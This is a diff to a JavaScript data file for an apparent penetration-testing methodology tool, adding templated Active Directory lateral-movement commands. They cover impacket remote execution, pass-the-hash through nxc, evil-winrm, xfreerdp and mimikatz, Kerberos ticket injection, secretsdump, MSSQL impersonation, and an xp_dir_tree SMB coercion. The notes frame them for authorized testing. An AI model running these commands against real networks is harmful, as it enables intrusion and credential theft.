@@ -3,7 +3,7 @@
 'use strict';
 const lanes=root.OBOL_LANES||[],O=root.OBOL_ORANGE_AD_2025_03,M45=root.OBOL_METHODOLOGY_V45,M47=root.OBOL_METHODOLOGY_V47,M77=root.OBOL_METHODOLOGY_V77,F=root.OBOL_ORANGE_FIDELITY_V64,F78=root.OBOL_ORANGE_FIDELITY_V78;
 if(!O||!M45||!M47||!M77||!F||!F78)throw new Error('Obol Orange plus v4.5/v4.7/v7.7 methodology and v7.8 fidelity layers are required before methodology-v7.8.js');
-function lane(id){return lanes.find(x=>x.lane===id);}function card(id){for(const l of lanes)for(const c of l.cards||[])if(c.id===id)return c;return null;}function addCard(laneId,c){const l=lane(laneId);if(!l)throw new Error('Missing lane '+laneId);const old=card(c.id);if(old)return old;c.lane=laneId;l.cards.push(c);return c;}
+function lane(id){return lanes.find(x=>x.lane===id);}function card(id){for(const l of lanes)for(const c of l.cards||[])if(c.id===id)return c;return null;}function addCard(laneId,c){const l=lane(laneId);if(!l)throw new Error('Missing lane '+laneId);const old=card(c.id);if(old)return old;c.lane=laneId;l.cards.push(c);return c;}function addCommand(c,cmd){if(!c)return;c.commands=c.commands||[];if(!c.commands.some(x=>String(x.run||'')===String(cmd.run||'')))c.commands.push(cmd);}
 const surf=s=>({operatorSurface40:s,operatorSurface78Source:'audited-v7.8'}),stage={stage:'movement',order:50,label:'Move with proven access',summary:'Use only separately proven credentials, hashes, tickets, certificates, or relay sessions to validate the next service boundary. Material, authentication, file access, execution, privilege, coercion, and cleanup remain separate proof states.',canonicalKeys:[]};
 function section(key){for(const f of O.files||[])for(const s of f.sections||[])if(s.key===key)return s;return null;}
 function attach(c,p){c.evidence45={...p};M45.profiles[c.id]={...p};if(!M45.profileCardIds.includes(c.id))M45.profileCardIds.push(c.id);const r=M47.reportContract(c);if(r){c.report47={...r,evidenceProfile:true,evidenceFamily:p.family,evidenceSource:'v7.8',claims:[...(p.claims||[])]};const old=(M47.contracts||[]).find(x=>x.cardId===c.id);if(old)Object.assign(old,c.report47);else{M47.contracts=M47.contracts||[];M47.contracts.push({...c.report47});}}}
@@ -30,19 +30,53 @@ const profiles={
  'relay-socks-78':{family:'relay-socks-movement',source:'v7.8',proof:'explicit downstream service output through an already-proven relay SOCKS session; authentication, authorization, file access, domain hashes, execution, and privilege remain separate',claims:['relay.socks','ad.domain_sid','db.mssql_access','credential.domain_hashes','smb.shares','remote.execution']},
  'certificate-movement-78':{family:'certificate-movement',source:'v7.8',proof:'explicit TGT/ccache, explicit recovered NT hash, or explicit authenticated LDAP shell output; certificate possession alone creates no access or privilege',claims:['kerberos.tickets','credential.ntlm_hash','ldap.authenticated']}
 };for(const c of [socks,cert])attach(c,profiles[c.id]);
+
+// Deepen mature owners so the atomic ledger is backed by practical human-run Run contracts rather than broad labels alone.
+const lateral=card('lateral-exec');
+for(const cmd of [
+ {tool:'impacket-atexec',run:"impacket-atexec '{{domain}}/{{user}}:{{password}}'@{{target}} 'whoami'",note:'Scheduled-task pseudo-shell variant from the pinned source. Require returned command output before recording execution.',opts:[{arg:'command',semantic:'Remote command',placeholder:'whoami',tip:'Use the minimum command needed to prove execution.',category:'Action'}],...surf('kali')},
+ {tool:'impacket-smbexec',run:"impacket-smbexec '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'SMB service pseudo-shell variant. Shell creation does not imply SYSTEM until identity output confirms it.',...surf('kali')},
+ {tool:'impacket-dcomexec',run:"impacket-dcomexec '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'DCOM pseudo-shell variant. Keep authentication, command execution, and privilege as separate Evidence boundaries.',...surf('kali')},
+ {tool:'xfreerdp',run:"xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /d:{{domain}} /cert:ignore /dynamic-resolution",note:'Cleartext RDP movement. A desktop/session proves RDP access only, not administrator context.',...surf('kali')},
+ {tool:'impacket-smbclient',run:"impacket-smbclient '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'Authenticated SMB file-access branch. Share/file reads are Evidence distinct from execution.',...surf('kali')},
+ {tool:'smbclient-ng',run:"smbclient-ng -d {{domain}} -u {{user}} -p '{{password}}' --host {{target}}",note:'Modern SMB browsing alternative for the pinned file-search branch.',...surf('kali')},
+ {tool:'nxc',run:'nxc smb {{target}} -u {{user}} -H {{hash}} -x "whoami"',note:'Pass-the-hash execution validation. Returned output proves execution; Pwn3d!/admin hints do not silently become SYSTEM.',opts:[{arg:'-x',semantic:'Remote command',placeholder:'whoami',tip:'Keep the validation command bounded.',category:'Action'}],...surf('kali')},
+ {tool:'evil-winrm',run:"evil-winrm -i {{target}} -u {{user}} -H '{{hash}}'",note:'WinRM pass-the-hash variant from the pinned source.',...surf('kali')},
+ {tool:'impacket-reg',run:"impacket-reg -hashes ':{{hash}}' '{{domain}}/{{user}}'@{{target}} query -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin'",note:'Before changing Restricted Admin for RDP PTH, capture the current value so it can be restored after the authorized validation.',...surf('kali')},
+ {tool:'impacket-reg',run:"impacket-reg -hashes ':{{hash}}' '{{domain}}/{{user}}'@{{target}} add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt REG_DWORD -vd 0",note:'Enable Restricted Admin only when required for the reviewed RDP PTH path. Restore the captured prior value immediately after validation.',...surf('kali')},
+ {tool:'xfreerdp',run:'xfreerdp /v:{{target}} /u:{{user}} /d:{{domain}} /pth:{{hash}} /cert:ignore /dynamic-resolution',note:'Restricted-Admin RDP pass-the-hash validation. Desktop access remains separate from administrator/SYSTEM proof.',...surf('kali')}
+])addCommand(lateral,cmd);
+
+const tickets=card('ticket-reuse');
+for(const cmd of [
+ {tool:'mimikatz',run:'sekurlsa::pth /user:{{user}} /domain:{{domain}} /ntlm:{{hash}} /run:cmd.exe',note:'Windows pass-the-hash process context. The new process proves a logon context only; downstream authentication remains separate.',...surf('windows')},
+ {tool:'impacket-ticketConverter',run:'impacket-ticketConverter {{file}} converted-ticket.ccache',note:'Convert kirbi/ccache formats. File conversion proves only a converted ticket artifact.',...surf('kali')},
+ {tool:'mimikatz',run:'kerberos::ptc "{{file}}"',note:'Windows ccache ticket injection variant. Injection requires separate service validation.',...surf('windows')},
+ {tool:'impacket-tgssub',run:'impacket-tgssub -in {{file}} -out modified.ccache -altservice cifs/{{target_sam}}.{{domain}}',note:'Substitute the reviewed SPN on a compatible service ticket. Validate the modified ticket against the intended service separately.',...surf('kali')},
+ {tool:'impacket-secretsdump',run:"impacket-secretsdump -aesKey {{hash}} -k -no-pass '{{domain}}/{{user}}'@{{target_sam}}.{{domain}}",note:'AES-key Kerberos service use with FQDN naming. Returned service output is required before recording access or credential material.',...surf('kali')}
+])addCommand(tickets,cmd);
+
+const sql=card('mssql-access');
+for(const cmd of [
+ {tool:'nxc',run:"nxc mssql {{target}} -u {{user}} -p '{{password}}' -d {{domain}}",note:'Fast MSSQL authentication validation before selecting a database action.',...surf('kali')},
+ {tool:'bloodhound-cypher',run:'MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p',note:'Identify SQLAdmin relationships. A graph edge is a candidate path, not proof of a live SQL login.',...surf('kali')},
+ {tool:'impacket-mssqlclient',run:'enum_db',note:'Inside mssqlclient: enumerate databases after authenticated SQL access is already proven.',...surf('kali')},
+ {tool:'impacket-mssqlclient',run:'enum_impersonate',note:'Inside mssqlclient: enumerate impersonation candidates. Candidate rights do not prove successful impersonation.',...surf('kali')},
+ {tool:'impacket-mssqlclient',run:'exec_as_login {{user}}',note:'Inside mssqlclient: move into a separately enumerated impersonatable login and preserve the returned SQL context.',...surf('kali')},
+ {tool:'impacket-mssqlclient',run:'xp_dir_tree \\{{lhost}}\\share',note:'Inside mssqlclient: trigger the reviewed SMB coercion path. The trigger is not inbound authentication or relay success.',...surf('kali')},
+ {tool:'impacket-mssqlclient',run:'enum_links',note:'Current Impacket linked-server inventory, preferred over stale trustlink/sp_linkedservers spellings while preserving source lineage.',...surf('kali')},
+ {tool:'impacket-mssqlclient',run:'use_link {{target_sam}}',note:'Inside mssqlclient: enter a separately enumerated linked SQL server. Linked SQL context is not OS execution.',...surf('kali')},
+ {tool:'impacket-mssqlclient',run:"EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;",note:'Cleanup: if xp_cmdshell was enabled solely for the authorized test, restore the prior disabled state after preserving Evidence.',...surf('kali')}
+])addCommand(sql,cmd);
+
 function unitIds(key){return (F.units||[]).filter(x=>x.sourceFile==='lat_move.md'&&x.canonicalKey===key).map(x=>x.id);}
 function complete(ids){return ids.length>0&&ids.every(id=>{const u=(F.units||[]).find(x=>x.id===id);return u&&['modeled','superseded','rejected'].includes(u.auditStatus)&&(F.dimensions||[]).every(d=>u.review&&u.review[d.id]===true);});}
 function advance(key,ids,note){const units=unitIds(key);if(!complete(units))throw new Error('v7.8 cannot reconcile '+key+' before its lateral-movement source units are terminal and fidelity-complete');const s=section(key);if(!s)throw new Error('Missing canonical section '+key);if(s.status!=='partial')throw new Error('v7.8 expected frozen partial '+key+' but found '+s.status);s.status='implemented';s.cardIds=ids.slice();s.note=note;s.advancedIn='7.8';s.sourceDepthAudit62={status:'modeled',reason:note};for(const id of ids){const c=card(id);if(!c)throw new Error('Missing v7.8 canonical owner '+id);provenance(c,key);}}
 advance('lat_move.socks',[socks.id],'v7.8 models the pinned relayed SOCKS service-use family while keeping relay session, service authentication, authorization, file access, replicated hashes, execution, and privilege separate.');
 advance('lat_move.certificate',[cert.id],'v7.8 models PKINIT, UnPAC-the-hash, and Schannel certificate movement while separating certificate material, tickets, recovered NT material, authenticated LDAP context, mutation, execution, and privilege.');
-const historical={
- 'lat_move.plaintext':['lateral-exec','mssql-access'],
- 'lat_move.nt-hash':['lateral-exec','ticket-reuse'],
- 'lat_move.kerberos':['ticket-reuse','kerberos-tickets',socks.id],
- 'lat_move.mssql':['mssql-access','bloodhound-collect']
-};
-for(const [key,owners] of Object.entries(historical))for(const id of owners){const c=card(id);if(c){provenance(c,key);c.atomic78=[...new Set([...(c.atomic78||[]),...unitIds(key).filter(uid=>{const u=(F.units||[]).find(x=>x.id===uid);return u&&(u.ownerCardIds||[]).includes(id);})])];}}
-socks.atomic78=[...new Set([...(socks.atomic78||[]),...unitIds('lat_move.socks'),...unitIds('lat_move.kerberos').filter(id=>id==='lat-move.kerb-proxychains')])];cert.atomic78=unitIds('lat_move.certificate');
+
+// Every audited unit leaves explicit lineage on every real Obol owner, including mature cards reused by this release.
+for(const uid of F78.auditedIds||[]){const u=(F.units||[]).find(x=>x.id===uid);if(!u)throw new Error('Missing v7.8 source-fidelity unit '+uid);for(const owner of u.ownerCardIds||[]){const c=card(owner);if(!c)throw new Error('Missing v7.8 owner '+owner+' for '+uid);provenance(c,u.canonicalKey);c.atomic78=[...new Set([...(c.atomic78||[]),uid])];}}
 O.coverageRevision='7.8';O.coverageOverlay='data/methodology-v7.8.js';
 root.OBOL_METHODOLOGY_V78={version:'7.8.0',profiles,cardIds:[socks.id,cert.id],fidelityIds:F78.auditedIds.slice(),advancedKeys:['lat_move.socks','lat_move.certificate'],completedBaselineKeys:['lat_move.socks','lat_move.certificate'],historicalCanonical:['lat_move.plaintext','lat_move.nt-hash','lat_move.kerberos','lat_move.mssql'],statement:'v7.8 atomizes the complete pinned lat_move.md family, advances only the two lateral-movement parents still present in the frozen v6.2 source-depth baseline, and deepens the historically complete cleartext, NT-hash, Kerberos, and MSSQL paths without rewriting their completion milestones.'};
 })(typeof window!=='undefined'?window:globalThis);
